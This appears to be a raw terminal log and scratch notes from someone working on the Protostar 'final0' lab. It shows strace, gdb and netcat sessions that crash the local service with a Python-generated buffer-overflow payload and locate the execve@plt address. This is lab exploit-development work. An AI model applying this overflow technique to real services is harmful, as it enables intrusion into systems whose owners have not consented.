[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "\0", 1)            = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "a", 1)             = 1
[pid  1892] read(0, "b", 1)             = 1
[pid  1892] read(0, "b", 1)             = 1
[pid  1892] read(0, "b", 1)             = 1
[pid  1892] read(0, "b", 1)             = 1
[pid  1892] read(0, "c", 1)             = 1
[pid  1892] read(0, "c", 1)             = 1
[pid  1892] read(0, "c", 1)             = 1
[pid  1892] read(0, "c", 1)             = 1
[pid  1892] read(0, "d", 1)             = 1
[pid  1892] read(0, "d", 1)             = 1
[pid  1892] read(0, "d", 1)             = 1
[pid  1892] read(0, "d", 1)             = 1
[pid  1892] read(0, "e", 1)             = 1
[pid  1892] read(0, "e", 1)             = 1
[pid  1892] read(0, "e", 1)             = 1
[pid  1892] read(0, "e", 1)             = 1
[pid  1892] read(0, "f", 1)             = 1
[pid  1892] read(0, "f", 1)             = 1
[pid  1892] read(0, "f", 1)             = 1
[pid  1892] read(0, "f", 1)             = 1
[pid  1892] read(0, "g", 1)             = 1
[pid  1892] read(0, "g", 1)             = 1
[pid  1892] read(0, "g", 1)             = 1
[pid  1892] read(0, "g", 1)             = 1
[pid  1892] read(0, "h", 1)             = 1
[pid  1892] read(0, "h", 1)             = 1
[pid  1892] read(0, "h", 1)             = 1
[pid  1892] read(0, "h", 1)             = 1
[pid  1892] read(0, "\n", 1)            = 1
[pid  1892] brk(0)                      = 0x804b000
[pid  1892] brk(0x806c000)              = 0x806c000
[pid  1892] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
Process 1892 detached
<... accept resumed> 0xbffff7a8, [16])  = ? ERESTARTSYS (To be restarted)
--- SIGCHLD (Child exited) @ 0 (0) ---
wait4(-1, [{WIFSIGNALED(s) && WTERMSIG(s) == SIGSEGV}], 0, NULL) = 1892
sigreturn()                             = ? (mask now [])
accept(3, ^C <unfinished ...>
Process 1889 detached
root@protostar:/opt/protostar/bin# ps aux | grep final0
root      1889  0.0  0.0   1532   280 ?        Ss   13:29   0:00 ./final0
root      1912  0.0  0.0   3296   728 pts/0    S+   13:36   0:00 grep final0
root@protostar:/opt/protostar/bin# gdb `pidof final0`
gdb >> set follow-fork-mode child

seg at 67666666 == fffg

gdb)info functions @plt          ,,,,,,, all referce function of plt


take address of execve@plt  0x08048c0c





Terminal 2 :::



root@protostar:/tmp# nc 127.0.0.1 2995
hello
No such user HELLO
root@protostar:/tmp# we need 512 byte and than overflow
bash: we: command not found
root@protostar:/tmp# python -c 'print "a"*510'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhh
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"' | /opt/protostar/bin/final0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"' | /opt/protostar/bin/final0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
root@protostar:/tmp# killall  final0
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"' | nc 127.0.0.1 2995
root@protostar:/tmp# --- SIGSEGV (Segmentation fault) @ 0 (0) ---
bash: syntax error near unexpected token `('
root@protostar:/tmp# ls
net1.py  net2.py
root@protostar:/tmp# ls -al
total 8
drwxrwxrwt  2 root root  80 May 11 13:17 .
drwxr-xr-x 27 root root 200 May 11 11:57 ..
-rw-r--r--  1 root root 266 May 11 12:45 net1.py
-rw-r--r--  1 root root 358 May 11 13:02 net2.py
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"' | nc 127.0.0.1 2995
root@protostar:/tmp# ls -al
total 8
drwxrwxrwt  2 root root  80 May 11 13:17 .
drwxr-xr-x 27 root root 200 May 11 11:57 ..
-rw-r--r--  1 root root 266 May 11 12:45 net1.py
-rw-r--r--  1 root root 358 May 11 13:02 net2.py
root@protostar:/tmp# python -c 'print "a"*510+"\00"+"aaaabbbbccccddddeeeeffffgggghhhh"' | nc 127.0.0.1 2995
root@protostar:/tmp# 




